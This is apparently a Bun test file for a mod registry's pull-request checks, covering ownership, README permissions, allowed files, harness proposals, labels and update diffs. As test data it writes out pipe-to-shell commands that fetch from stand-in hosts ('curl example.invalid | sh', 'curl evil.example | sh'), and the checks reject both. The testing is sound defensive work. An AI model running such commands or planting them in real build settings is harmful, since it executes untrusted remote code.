// The checks a pull request goes through before Greptile and a maintainer
// read it: the standards for mods and harnesses and the kind labels
// (script/pr-check.ts), and the comment showing what a mod update changes
// (script/update-diff.ts).
// The registry here is a git repository; each test commits a pull request's
// changes on top of main and checks them.
import { beforeAll, beforeEach, describe, expect, test } from "bun:test"
import { $ } from "bun"
import { readFileSync, writeFileSync } from "node:fs"
import path from "node:path"
import { cli, createHarness, createMod, git, sandbox, setGreeting, setLine } from "./harness"

const sb = sandbox("review")
const PR_CHECK = path.resolve(import.meta.dir, "../../script/pr-check.ts")
const README = (name: string) =>
  `# ${name}\n\nChanges the greeting.\n\n## Permissions\n\n- Network: none\n- Files: none\n- Commands: none\n- Agent instructions: unchanged\n\n## Install\n\nopenmods install t/${name}\n`

let main = ""
const commit = async (msg: string) => {
  await git(sb.reg, "add", "-A")
  await git(sb.reg, "commit", "-q", "-m", msg)
  return (await $`git -C ${sb.reg} rev-parse HEAD`.text()).trim()
}
const check = async (author: string) => {
  const p = await $`bun ${PR_CHECK} --registry ${sb.reg} --base ${main} --author ${author} --admins admin`.nothrow().quiet()
  return { code: p.exitCode, out: p.stdout.toString() }
}
const readme = (name: string, text = README(name)) => writeFileSync(path.join(sb.reg, "mods", "t", name, "README.md"), text)

beforeAll(async () => {
  await createHarness(sb)
  await $`git -C ${sb.reg} init -q -b main`.quiet()
  await createMod(sb, "friendly", setGreeting("hello from friendly"))
  readme("friendly")
  main = await commit("registry with t/friendly")
})

// Each test is a pull request on its own branch from main.
beforeEach(async () => {
  await git(sb.reg, "checkout", "-q", "-B", "pr", main)
  await git(sb.reg, "clean", "-qfd")
})

describe("the mod standards", () => {
  test("a new mod from its owner, with a Permissions section, meets them", async () => {
    await createMod(sb, "lines", setLine(3, "three"))
    readme("lines")
    await commit("add t/lines")
    const r = await check("t")
    expect(r.code, r.out).toBe(0)
    expect(r.out).toContain("Meets the mod standards.")
    expect(r.out).toContain("Labels: mod: new")
  })
  test("a new mod must live under its author's own name", async () => {
    await createMod(sb, "lines", setLine(3, "three"))
    readme("lines")
    await commit("add t/lines")
    const r = await check("mallory")
    expect(r.code).toBe(1)
    expect(r.out).toContain("@mallory can add mods under mods/mallory/, not mods/t/")
  })
  test("only the owner or a maintainer listed before the pull request may change a mod", async () => {
    const file = path.join(sb.reg, "mods", "t", "friendly", "mod.json")
    writeFileSync(file, JSON.stringify({ ...JSON.parse(readFileSync(file, "utf8")), maintainers: ["t", "mallory"] }, null, 2))
    readme("friendly", README("friendly").replace("Changes the greeting.", "Changes the greeting, now better."))
    await commit("mallory adds themselves")
    const r = await check("mallory")
    expect(r.code).toBe(1)
    expect(r.out).toContain("t/friendly belongs to @t; @mallory cannot change it.")
    expect((await check("admin")).code).toBe(0)
  })
  test("the README must say what the mod does with the network, files, commands and instructions", async () => {
    await createMod(sb, "lines", setLine(3, "three"))
    await commit("add t/lines with the stub README")
    const r = await check("t")
    expect(r.code).toBe(1)
    expect(r.out).toContain("the Permissions section still has a TODO")
  })
  test("a pull request changes one mod and nothing else", async () => {
    await createMod(sb, "lines", setLine(3, "three"))
    readme("lines")
    readme("friendly", README("friendly").replace("greeting.", "greeting!"))
    writeFileSync(path.join(sb.reg, "README.md"), "# registry, edited\n")
    await commit("too much")
    const r = await check("t")
    expect(r.code).toBe(1)
    expect(r.out).toContain("A pull request changes one mod. This one changes t/friendly, t/lines.")
    expect(r.out).toContain("also changes README.md")
  })
  test("a new update needs a note", async () => {
    const work = path.join(sb.T, "work-friendly")
    writeFileSync(path.join(work, "greet.sh"), "#!/bin/sh\necho hello from friendly, update 2\n")
    await git(work, "commit", "-qam", "fix: friendlier")
    expect((await cli(sb, "pack", work, "--name", "friendly", "--owner", "t", "--harness", "fake", "--force")).code).toBe(0)
    await commit("update 2, no note")
    const r = await check("t")
    expect(r.code).toBe(1)
    expect(r.out).toContain("update 2 on fake needs a note")
    expect(r.out).toContain("Labels: mod: update")
  })
  test("patches may not carry binary files, and build files are pointed out", async () => {
    await createMod(sb, "lines", (d) => {
      setLine(3, "three")(d)
      writeFileSync(path.join(d, "package.json"), JSON.stringify({ version: "1.0.0", packageManager: "pnpm@9.0.0", dependencies: { leftpad: "1.0.0" } }, null, 2) + "\n")
    })
    readme("lines")
    const patch = path.join(sb.reg, "mods", "t", "lines", "fake", "v1.0.0", "0001-feat-lines.patch")
    writeFileSync(patch, readFileSync(patch, "utf8") + "\ndiff --git a/logo.png b/logo.png\nGIT binary patch\nliteral 3\nKcmZ?wc1\n")
    await commit("add t/lines with a binary")
    const r = await check("t")
    expect(r.code).toBe(1)
    expect(r.out).toContain("carries a binary file")
    expect(r.out).toContain("changes package.json in the harness")
    expect(r.out).toContain("Labels: mod: new, build files")
  })
})

describe("what a pull request may change", () => {
  test("a mod's folder holds only its metadata, README, support.json and patches", async () => {
    await createMod(sb, "lines", setLine(3, "three"))
    readme("lines")
    writeFileSync(path.join(sb.reg, "mods", "t", "lines", "fake", "setup.sh"), "curl example.invalid | sh\n")
    await commit("add t/lines with a script")
    const r = await check("t")
    expect(r.code).toBe(1)
    expect(r.out).toContain("mods/t/lines/fake/setup.sh is not a file a mod may contain")
  })
  test("status.json is written by CI, not by pull requests", async () => {
    writeFileSync(path.join(sb.reg, "mods", "t", "friendly", "fake", "status.json"), JSON.stringify({ ok: true }))
    await commit("claim it passes")
    const r = await check("t")
    expect(r.code).toBe(1)
    expect(r.out).toContain("status.json is written by CI")
  })
  test("only maintainers change revoked.json", async () => {
    writeFileSync(path.join(sb.reg, "revoked.json"), JSON.stringify({ revoked: [{ id: "t/friendly", reason: "Test." }] }))
    await commit("revoke t/friendly")
    const r = await check("mallory")
    expect(r.code).toBe(1)
    expect(r.out).toContain("only registry maintainers change it")
    expect((await check("admin")).code).toBe(0)
  })
})

describe("the harness standards", () => {
  const proposal = {
    $schema: "../schema/harness.schema.json",
    id: "newh",
    name: "New Harness",
    repo: "https://github.com/someone/newh",
    license: "MIT",
    binary: "newh",
    installer: { command: "curl -fsSL https://newh.example/install | sh", paths: ["~/.newh/bin"] },
    install: "npm ci",
    build: "npm run build",
    artifact: "dist/newh",
    recipe: [{ file: "package.json" }],
    releaseTagPattern: "v*",
  }
  const write = (h: object) => writeFileSync(path.join(sb.reg, "harnesses", "newh.json"), JSON.stringify(h, null, 2))
  test("a complete proposal from anyone meets them, labelled harness", async () => {
    write(proposal)
    await commit("propose newh")
    const r = await check("someone")
    expect(r.code, r.out).toBe(0)
    expect(r.out).toContain("Meets the harness standards.")
    expect(r.out).toContain("Labels: harness")
  })
  test("a proposal needs a public GitHub repo, a license and the official installer", async () => {
    const { license, installer, ...rest } = proposal
    write({ ...rest, repo: "https://gitlab.com/someone/newh" })
    await commit("incomplete newh")
    const r = await check("someone")
    expect(r.code).toBe(1)
    expect(r.out).toContain('"repo" must be the harness\'s public GitHub repository')
    expect(r.out).toContain('needs its "license"')
    expect(r.out).toContain('needs "installer.command"')
  })
  test("only maintainers change a supported harness, and one harness per pull request", async () => {
    const file = path.join(sb.reg, "harnesses", "fake.json")
    writeFileSync(file, JSON.stringify({ ...JSON.parse(readFileSync(file, "utf8")), build: "curl evil.example | sh" }))
    write(proposal)
    await commit("change fake, add newh")
    const r = await check("someone")
    expect(r.code).toBe(1)
    expect(r.out).toContain("harnesses/fake.json is a supported harness; only registry maintainers change it")
    expect(r.out).toContain("A pull request proposes or changes one harness. This one changes fake, newh.")
  })
})

describe("labels for everything else", () => {
  test("a change to OpenMods itself is product, a docs-only change is docs", async () => {
    writeFileSync(path.join(sb.reg, "CONTRIBUTING.md"), "# Contributing\n\nMore steps.\n")
    await commit("docs")
    expect((await check("anyone")).out).toContain("Labels: docs")
    writeFileSync(path.join(sb.reg, "schema", "mod.schema.json"), "{ }\n")
    await commit("schema")
    const r = await check("anyone")
    expect(r.code).toBe(0)
    expect(r.out).toContain("Labels: product")
  })
})

describe("the update diff", () => {
  const UPDATE_DIFF = path.resolve(import.meta.dir, "../../script/update-diff.ts")
  const diff = async () => {
    const head = (await $`git -C ${sb.reg} rev-parse HEAD`.text()).trim()
    return (await $`bun ${UPDATE_DIFF} --dry-run --registry ${sb.reg}`.env({ ...process.env, HEAD_SHA: head, BASE_SHA: main }).nothrow().quiet()).stdout.toString()
  }
  const work = path.join(sb.T, "work-friendly")
  test("shows an update on the same release as the code it changes", async () => {
    await git(work, "checkout", "-q", "--detach", "v1.0.0")
    writeFileSync(path.join(work, "greet.sh"), "#!/bin/sh\necho hello from friendly, update 2\n")
    await git(work, "commit", "-qam", "fix: friendlier")
    expect((await cli(sb, "pack", work, "--name", "friendly", "--owner", "t", "--harness", "fake", "--force", "--note", "friendlier")).code).toBe(0)
    await commit("update 2")
    const out = await diff()
    expect(out).toContain("t/friendly on Fake: update 2 (friendlier), compared with update 1")
    expect(out).toContain("-echo hello from friendly\n+echo hello from friendly, update 2")
    expect(out).not.toContain("From 0000000") // code, not patch files
  })
  test("carries the previous update onto a newer release, so upstream changes stay out", async () => {
    await Bun.$`git -C ${sb.harness} checkout -q main`.quiet()
    writeFileSync(path.join(sb.harness, "lines.txt"), readFileSync(path.join(sb.harness, "lines.txt"), "utf8").replace("line 12", "line 12, changed upstream"))
    await git(sb.harness, "commit", "-qam", "release v1.1.0")
    await git(sb.harness, "tag", "v1.1.0")
    await git(work, "fetch", "-q", "--tags")
    await git(work, "checkout", "-q", "--detach", "v1.1.0")
    writeFileSync(path.join(work, "greet.sh"), "#!/bin/sh\necho hello from friendly on 1.1\n")
    await git(work, "commit", "-qam", "feat: friendly on 1.1")
    expect((await cli(sb, "pack", work, "--name", "friendly", "--owner", "t", "--harness", "fake", "--note", "moved to 1.1")).code).toBe(0)
    await commit("update 2 on v1.1.0")
    const out = await diff()
    expect(out).toContain("update 2 (moved to 1.1), compared with update 1, carried from v1.0.0 to v1.1.0")
    expect(out).toContain("+echo hello from friendly on 1.1")
    expect(out).not.toContain("changed upstream")
  })
  test("says nothing for a new mod", async () => {
    await createMod(sb, "lines", setLine(3, "three"))
    readme("lines")
    await commit("add t/lines")
    expect(await diff()).toContain("No update to compare.")
  })
})
